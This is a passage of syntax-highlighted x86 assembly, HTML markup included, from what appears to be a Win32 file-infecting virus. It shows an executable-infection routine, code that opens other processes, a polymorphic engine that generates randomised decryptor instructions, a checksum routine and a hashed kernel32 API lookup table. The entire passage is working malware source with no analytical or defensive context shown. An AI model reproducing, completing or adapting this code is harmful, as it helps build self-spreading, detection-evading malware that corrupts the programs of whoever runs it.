    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;CloseHandle</span><span class="sc0">
   </span><span class="sc5">ie_failed</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">end_thread</span><span class="sc0"> </span><span class="sc5">infect_exe</span><span class="sc0">

   </span><span class="sc5">other_process</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">active</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">process</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">1F0FFFh</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;OpenProcess</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">13</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;WaitForSingleObject</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc5">other_process</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">infect_exe</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">checksum</span><span class="sc4">-</span><span class="sc5">poly_engine</span><span class="sc0">
</span><span class="sc5">poly_engine</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc5">start_thread</span><span class="sc0"> </span><span class="sc5">poly_engine</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">vbody</span><span class="sc4">+</span><span class="sc5">vsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">260</span><span class="sc4">+</span><span class="sc5">ci_size</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">242C8300h</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc5">@@a</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc10">@b</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@v</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@1_a</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@k</span><span class="sc0">
    </span><span class="sc5">@</span><span class="sc10">@b</span><span class="sc4">:</span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@c</span><span class="sc0">
    </span><span class="sc5">@@v</span><span class="sc4">:</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@1_a</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@k</span><span class="sc0">
    </span><span class="sc5">@@c</span><span class="sc4">:</span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@e</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@1</span><span class="sc0">             </span><span class="sc1">;push random value DWORD</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@2</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@l</span><span class="sc0">
    </span><span class="sc5">@@e</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;push random value WORD</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@1</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@2</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc5">@@k</span><span class="sc4">:</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc5">@@l</span><span class="sc4">:</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@a</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E4FFh</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">pe_failed</span><span class="sc0">

    </span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">              </span><span class="sc1">;push random value</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@1_d</span><span class="sc0">
  </span><span class="sc5">@@1_a</span><span class="sc4">:</span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;push certain value</span><span class="sc0">
  </span><span class="sc5">@@1_b</span><span class="sc4">:</span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@1_c</span><span class="sc0">               </span><span class="sc1">;push WORD</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
  </span><span class="sc5">@@1_c</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@3_a</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">
  </span><span class="sc5">@@1_d</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">@@2</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">              </span><span class="sc1">;POP reg32 or ADD ESP,4</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@2_b</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@2</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@2</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@2_a</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">@@2_a</span><span class="sc4">:</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
  </span><span class="sc5">@@2_b</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C483h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@2_c</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
  </span><span class="sc5">@@2_c</span><span class="sc4">:</span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">@@3</span><span class="sc4">:</span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;push certain value in EAX</span><span class="sc0">
  </span><span class="sc5">@@3_a</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">              </span><span class="sc1">;           in EBX</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@3_b</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
  </span><span class="sc5">@@3_b</span><span class="sc4">:</span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

  </span><span class="sc5">random</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0BFF71234h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc2">33</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">@@r</span><span class="sc4">:</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">197</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@r</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">random</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">poly_engine</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">pe_failed</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">end_thread</span><span class="sc0"> </span><span class="sc5">poly_engine</span><span class="sc0">
</span><span class="sc5">poly_engine</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">k32_addrs</span><span class="sc4">-</span><span class="sc5">checksum</span><span class="sc0">
</span><span class="sc5">checksum</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc5">start_thread</span><span class="sc0"> </span><span class="sc5">checksum</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc5">other_process_mem</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">         </span><span class="sc1">;get mem from other process</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;UnMapViewOfFile</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;CloseHandle</span><span class="sc0">
    </span><span class="sc5">end_thread</span><span class="sc0"> </span><span class="sc5">checksum</span><span class="sc0">
</span><span class="sc5">checksum</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">k32_addrs</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
       </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">vstart</span><span class="sc4">-&gt;</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpCreateFile</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpCloseHandle</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpCreateMutexA</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpGetLastError</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpReleaseMutex</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpExitProcess</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpCreateFileMappingA</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpMapViewOfFile</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpUnMapViewOfFile</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpGetSystemDirectory</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpWriteFile</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpCreateProcessA</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpOpenProcess</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpWaitForSingleObject</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpRegisterServiceProcess</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpGetFileSize</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpGlobalAlloc</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpGlobalFree</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpReadFile</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpSetFilePointer</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpSetErrorMode</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpGetCurrentProcessId</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpGetVersion</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">lpGetTickCount</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">malloc</span><span class="sc4">+</span><span class="sc2">63</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">malloc</span><span class="sc4">+</span><span class="sc2">51</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">malloc</span><span class="sc4">+</span><span class="sc2">106</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">count</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">k32_addrs</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">k32_crcs</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">08C892DDFh</span><span class="sc0">   </span><span class="sc1">;CreateFileA</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">068624A9Dh</span><span class="sc0">   </span><span class="sc1">;CloseHandle</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">020B943E7h</span><span class="sc0">   </span><span class="sc1">;CreateMutexA</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">087D52C94h</span><span class="sc0">   </span><span class="sc1">;GetLastError</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0C449CF4Eh</span><span class="sc0">   </span><span class="sc1">;ReleaseMutexA</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">040F57181h</span><span class="sc0">   </span><span class="sc1">;ExitProcess</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">096B2D96Ch</span><span class="sc0">   </span><span class="sc1">;CreateFileMappingA</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0797B49ECh</span><span class="sc0">   </span><span class="sc1">;MapViewOfFile</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">094524B42h</span><span class="sc0">   </span><span class="sc1">;UnMapViewOfFile</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0593AE7CEh</span><span class="sc0">   </span><span class="sc1">;GetSystemDirectoryA</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">021777793h</span><span class="sc0">   </span><span class="sc1">;WriteFile</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0267E0B05h</span><span class="sc0">   </span><span class="sc1">;CreateProcessA</span><span class="sc0">
